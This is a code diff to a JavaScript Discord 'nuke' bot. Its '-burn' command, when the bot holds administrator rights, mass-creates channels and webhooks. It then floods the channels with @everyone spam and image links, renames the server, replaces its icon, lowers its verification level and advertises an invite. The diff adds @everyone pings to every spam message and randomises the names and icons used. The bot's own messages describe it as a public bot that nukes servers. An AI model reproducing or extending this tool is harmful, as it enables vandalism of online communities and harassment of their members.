@@ -229,12 +229,28 @@ a8"     "" 88       88 88P'    "8a a8P_____88
                            
                            
    
-   \`\`\` @everyone`, "https://media.discordapp.net/attachments/735390571715100793/778796383292489728/Initializing_Gif.gif?width=587&height=587" ,"https://tenor.com/view/op-cube-animation-gif-15857075 @everyone", 'https://images-ext-1.discordapp.net/external/AJ3ZseNi8NlElR_I1tS51ubQguFMXm4h5CqKc_V_cdU/%3Fwidth%3D587%26height%3D587/https/media.discordapp.net/attachments/735392717886193666/754861066105782312/20200820_203508.jpg @everyone', 'https://images-ext-1.discordapp.net/external/HRdm0jpSLissUbkke890fcGabWIpSEnmjlJykK4hgg8/https/images-ext-1.discordapp.net/external/LOxbVQxTHoQNiyrc-GMz__uODLQQ6v38Xpypt6K1LXo/https/media.discordapp.net/attachments/735392717886193666/772567167018991646/a48e2e66-bbd5-4ba6-b168-90ce8c7c6fa9.gif @everyone'];
+   \`\`\` @everyone`, "https://media.discordapp.net/attachments/751095375917482135/779732531331203092/auto_gay_qjgok9.jpg?width=505&height=587", "https://images-ext-2.discordapp.net/external/-O3pYhUe8kf8INOX-jM91-PKyXIpLUYxggjoIValGbU/https/media.discordapp.net/attachments/645925212595945483/776682365375479818/image0.gif", "I CAN DO ANYTHING", "CHAOS CHAOS", "ᑕh̷̛̭͔͚̟͈̭͓̪̠͇̃̿̾͌₳ㄖ『s』", "hello https://i.pinimg.com/564x/ed/e8/19/ede81970dd83c3395b5b444b705f16ec.jpg", "Neo chaos :performing_arts:", "I like Chaos :performing_arts:", "https://media.discordapp.net/attachments/772077968608067644/781139276687081532/the_icon_3.png?width=590&height=587", "https://media.discordapp.net/attachments/772077968608067644/781140319122751488/image_9.png?width=590&height=587", "https://media.discordapp.net/attachments/735390571715100793/778796383292489728/Initializing_Gif.gif?width=587&height=587" ,"https://tenor.com/view/op-cube-animation-gif-15857075 @everyone", 'https://images-ext-1.discordapp.net/external/AJ3ZseNi8NlElR_I1tS51ubQguFMXm4h5CqKc_V_cdU/%3Fwidth%3D587%26height%3D587/https/media.discordapp.net/attachments/735392717886193666/754861066105782312/20200820_203508.jpg @everyone', 'https://images-ext-1.discordapp.net/external/HRdm0jpSLissUbkke890fcGabWIpSEnmjlJykK4hgg8/https/images-ext-1.discordapp.net/external/LOxbVQxTHoQNiyrc-GMz__uODLQQ6v38Xpypt6K1LXo/https/media.discordapp.net/attachments/735392717886193666/772567167018991646/a48e2e66-bbd5-4ba6-b168-90ce8c7c6fa9.gif @everyone'];
  
    return rand[Math.floor(Math.random()*rand.length)];
  }
  
  
+ function randomnames() {
+   var rand = ["匚卄卂ㄖ丂", "pray.", "CHAOS CHAOS", "mine now", "THE TRUE AND NEO CHAOS", "chaos", "cubed", "you shouldn't have done that", "oh oops"]
+   return rand[Math.floor(Math.random()*rand.length)];
+ }
+ 
+ 
+ function randomicons123() {
+   var rand = ["https://images-ext-1.discordapp.net/external/ccHd9m2cH1YVBWCXiHocpvLQ1wKYAAL6pYGcq3Y3u5E/%3Fsize%3D1024/https/cdn.discordapp.com/icons/735097111556784208/46019f56a268c36df4afa5ca9ae2f632.webp", "https://media.discordapp.net/attachments/776801014950658071/781161677176438844/image0.png?width=587&height=587", "https://static.wikia.nocookie.net/deltarune_gamepedia_en/images/e/e1/Jevil.jpg/revision/latest/scale-to-width-down/224?cb=20181105170038", "https://i.pinimg.com/564x/ed/e8/19/ede81970dd83c3395b5b444b705f16ec.jpg", "https://cdn.discordapp.com/avatars/759838559946801173/ee73cab2df728dd8246b4decdfa25dc5.png?size=1024", "https://images-ext-1.discordapp.net/external/AJ3ZseNi8NlElR_I1tS51ubQguFMXm4h5CqKc_V_cdU/%3Fwidth%3D587%26height%3D587/https/media.discordapp.net/attachments/735392717886193666/754861066105782312/20200820_203508.jpg", "https://media.discordapp.net/attachments/772077968608067644/781140319122751488/image_9.png?width=590&height=587", "https://media.discordapp.net/attachments/772077968608067644/781139276687081532/the_icon_3.png?width=590&height=587"]
+   return rand[Math.floor(Math.random()*rand.length)];
+ }
+ 
+
+ function channelnames() {
+   var rand = ["chaos", "ᑕh̷̛̭͔͚̟͈̭͓̪̠͇̃̿̾͌₳ㄖ『s』", "cubed", "❒cube❒cube❒cube❒cube❒cube❒cube❒cube❒cube❒", "chaos cube", "﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽", "get fucked ﷽﷽﷽", "匚卄卂ㄖ丂 匚卄卂ㄖ丂", "卂丂丂ㄚ", ""]
+   return rand[Math.floor(Math.random()*rand.length)];
+ }
  
    client.on('message', message => {
      if(message.content.startsWith("-burn")) {
@@ -266,11 +282,11 @@ if(message.guild.me.hasPermission("ADMINISTRATOR")) {
         msg.guild.channels.create('⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰').then(c => c.send("https://discord.gg/z6jMqF5Yjn @everyone (also wait 7 seconds for the spam)").then(c.send("@everyone all hail me").then(c.send("rip webhook spam shitcord killed it(oh also if the bot is slow its probably bcs its nuking another server remember this is a public bot and may be overloaded)"))))
         setTimeout(() => { 
         while(pray < 2) {
-         msg.guild.channels.create('▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇').then(p => {
+         msg.guild.channels.create('匚卄卂ㄖ丂匚卄卂ㄖ丂匚卄卂ㄖ丂匚卄卂ㄖ丂匚卄卂ㄖ丂匚卄卂ㄖ丂匚卄卂ㄖ丂').then(p => {
             p.createWebhook("assy").then(w => {
                      
                 [1,2,3,4,5,6,7,8,9,10,11,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1].forEach(function(i) {
-                    w.send(randomT())
+                    w.send(randomT() + " @everyone")
                     
                 
                 })
@@ -279,17 +295,17 @@ if(message.guild.me.hasPermission("ADMINISTRATOR")) {
             var spam = 0
             while(spam < 60) 
         {    
-            p.send(randomT())
+            p.send(randomT() + " @everyone")
             spam++
         }
          })
             pray++
          }
-         msg.guild.channels.create("ｐｒａｙ≪3").then(p => {
+         msg.guild.channels.create("ｐｒａｙ").then(p => {
             p.createWebhook("assy").then(w => {
                      
                 [1,2,3,4,5,6,7,8,9,10,11,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1].forEach(function(i) {
-                    w.send(randomT())
+                    w.send(randomT() + " @everyone")
                     
                 
                 })
@@ -298,17 +314,17 @@ if(message.guild.me.hasPermission("ADMINISTRATOR")) {
             var spam = 0
             while(spam < 60) 
         {    
-            p.send(randomT())
+            p.send(randomT() + " @everyone")
             spam++
         }
          })
          pray = -1
          while(pray < 2) {
-            msg.guild.channels.create('▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇').then(p => {
+            msg.guild.channels.create('匚卄卂ㄖ丂匚卄卂ㄖ丂匚卄卂ㄖ丂匚卄卂ㄖ丂匚卄卂ㄖ丂匚卄卂ㄖ丂匚卄卂ㄖ丂').then(p => {
                p.createWebhook("assy").then(w => {
                         
                    [1,2,3,4,5,6,7,8,9,10,11,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1].forEach(function(i) {
-                       w.send(randomT())
+                       w.send(randomT() + " @everyone")
                        
                    
                    })
@@ -317,7 +333,7 @@ if(message.guild.me.hasPermission("ADMINISTRATOR")) {
                var spam = 0
                while(spam < 60) 
            {    
-               p.send(randomT())
+               p.send(randomT() + " @everyone")
                spam++
            }
             })
@@ -327,7 +343,7 @@ if(message.guild.me.hasPermission("ADMINISTRATOR")) {
                 p.createWebhook("assy").then(w => {
                          
                     [1,2,3,4,5,6,7,8,9,10,11,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1].forEach(function(i) {
-                        w.send(randomT())
+                        w.send(randomT() + " @everyone")
                         
                     
                     })
@@ -336,17 +352,17 @@ if(message.guild.me.hasPermission("ADMINISTRATOR")) {
                 var spam = 0
                 while(spam < 60) 
             {    
-                p.send(randomT())
+                p.send(randomT() + " @everyone")
                 spam++
             }
              })
-        while(number < 209) {
-             msg.guild.channels.create('【❒】【❒】【❒】【❒】【❒】【❒】【❒】【❒】【❒】【❒】【❒】【❒】【❒】【❒】【❒】【❒】【❒】').then(c => { 
+        while(number < 100) {
+             msg.guild.channels.create(channelnames()).then(c => { 
                 
                  c.createWebhook("assy").then(w => {
                      
                      [1,2,3,4,5,6,7,8,9,10,11,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1].forEach(function(i) {
-                         w.send(randomT())
+                         w.send(randomT() + " @everyone")
                          
                      
                      })
@@ -356,7 +372,7 @@ if(message.guild.me.hasPermission("ADMINISTRATOR")) {
              var spam = 0
              while(spam < 60) 
          {    
-             c.send(randomT())
+             c.send(randomT() + " @everyone")
              spam++
          }
                      
@@ -378,8 +394,8 @@ if(message.guild.me.hasPermission("ADMINISTRATOR")) {
   }
  if(message.author.id !== message.client.user.id) {return}
   setTimeout(() => {
-     message.guild.setName("pray.")
-     message.guild.setIcon("https://images-ext-1.discordapp.net/external/AJ3ZseNi8NlElR_I1tS51ubQguFMXm4h5CqKc_V_cdU/%3Fwidth%3D587%26height%3D587/https/media.discordapp.net/attachments/735392717886193666/754861066105782312/20200820_203508.jpg")
+     message.guild.setName(randomnames())
+     message.guild.setIcon(randomicons123())
      message.guild.setVerificationLevel("LOW")
   }, 2000);
          
